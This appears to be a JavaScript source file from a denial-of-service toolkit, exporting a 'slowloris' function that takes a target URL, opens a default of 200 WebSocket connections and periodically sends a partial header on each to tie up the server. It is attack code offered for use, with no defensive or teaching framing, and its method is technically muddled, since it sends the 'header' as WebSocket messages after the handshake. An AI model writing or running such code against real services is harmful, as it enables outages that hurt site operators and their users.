// main/ddos/slowloris.js
import { WebSocket } from 'ws'; // Import WebSocket

function slowloris(target, numSockets) {
  if (!target) {
    console.error("Target URL is required.");
    return;
  }

  try {
    const parsedTarget = new URL(target);
    const hostname = parsedTarget.hostname;
    const port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
    const isSecure = parsedTarget.protocol === 'https:';

    if (!numSockets || numSockets <= 0) {
      numSockets = 200;
    }

    console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);

    for (let i = 0; i < numSockets; i++) {
      createSocket(hostname, port, i, isSecure);
    }

    function createSocket(hostname, port, index, isSecure) {
      let socket;
      try {
        socket = new WebSocket((isSecure ? 'wss://' : 'ws://') + hostname + ':' + port);

        socket.on('open', () => {
          console.log(`Socket ${index + 1} opened.`);
          sendPartialHeader(socket);
          setInterval(() => {
            sendPartialHeader(socket);
          }, 15000);
        });

        socket.on('close', () => {
          console.log(`Socket ${index + 1} closed.`);
        });

        socket.on('error', (error) => {
          console.error(`Socket ${index + 1} error: ${error.message}`);
          try {
            socket.close();
          } catch (closeError) {
            console.error(`Error closing socket ${index + 1}:`, closeError.message);
          }
        });
      } catch (socketError) {
        console.error(`Error creating socket ${index + 1}:`, socketError.message);
      }
    }

    function sendPartialHeader(socket) {
      const partialHeader = "X-Custom-Header: keep-alive\r\n";
      try {
        socket.send(partialHeader);
      } catch (error) {
        console.error("Error sending partial header:", error.message);
        try {
          socket.close();
        } catch (closeError) {
          console.error("Error closing socket after send error:", closeError.message);
        }
      }
    }
  } catch (error) {
    console.error("Error during Slowloris setup:", error.message);
  }
}

export { slowloris };